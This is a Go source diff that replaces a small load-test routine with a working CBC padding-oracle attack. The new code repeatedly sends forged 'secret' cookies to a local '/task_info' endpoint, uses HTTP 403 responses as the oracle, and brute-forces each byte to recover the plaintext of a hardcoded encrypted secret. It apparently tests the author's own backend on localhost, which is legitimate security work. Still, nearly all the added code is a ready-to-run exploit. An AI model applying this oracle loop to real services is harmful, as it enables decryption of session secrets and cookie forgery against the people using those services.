@@ -1,13 +1,15 @@
 package main
 
 import (
+	"brainhugger/backend/cbc"
 	"bytes"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
+	"math/rand"
 	"net/http"
 	"sync"
-	"time"
 )
 
 type Task struct {
@@ -70,14 +72,52 @@ func addNewUser(wg *sync.WaitGroup, password string) []byte {
 	return res
 }
 
-func main() {
-	var wg sync.WaitGroup
-	start := time.Now()
-	cnt := 500
-	for i := 0; i < cnt; i++ {
-		wg.Add(1)
-		go addNewTask(&wg, "+++++++", "", "token", 0)
+func tryDecr(encrypted []byte) bool {
+	secretB64 := base64.StdEncoding.EncodeToString(encrypted)
+	req, err := http.NewRequest("GET", "http://localhost:8080/task_info/4", nil)
+	if err != nil {
+		panic(err)
 	}
-	wg.Wait()
-	fmt.Println(float64(cnt) / (time.Now().Sub(start).Seconds()))
+	req.AddCookie(&http.Cookie{Name: "secret", Value: secretB64})
+	req.AddCookie(&http.Cookie{Name: "uid", Value: "1"})
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		panic(err)
+	}
+	return resp.StatusCode == 403
+}
+
+func paddingOrcaleAttack(encrypted1 []byte) {
+	encrypted := append(cbc.InitVector, encrypted1[:16]...)
+	encryptedCopy := append(cbc.InitVector, encrypted1[:16]...)
+
+	result := make([]byte, 16)
+
+	i2 := make([]byte, 16)
+	for k := 1; k < 17; k++ {
+		for j := 0; j < k - 1; j++ {
+			encrypted[15 - j] = i2[15 - j] ^ byte(k)
+		}
+		for i := 0; i < 256; i++ {
+			if _, err1 := rand.Read(encrypted[:16 - k]); err1 != nil {
+				panic(err1)
+			}
+			encrypted[16 - k] = byte(i)
+			if tryDecr(encrypted) {
+				i2[16 - k] = byte(i) ^ byte(k)
+				result[16 - k] = i2[16 - k] ^ encryptedCopy[16 - k]
+			}
+		}
+	}
+	//result = result[:16 - result[len(result) - 1]]
+	fmt.Println(string(result))
+	fmt.Println(i2)
+}
+
+func main() {
+	//secretB64 := "XwcPJnI7JRJyYo4WZH2S3Q=="
+	//secret := []byte{95, 7, 15, 38, 114, 59, 37, 18, 114, 98, 142, 22, 100, 125, 146, 221}
+	secret := []byte{95, 7, 15, 38, 114, 59, 37, 18, 114, 98, 142, 22, 100, 125, 146, 221}
+	paddingOrcaleAttack(secret)
 }
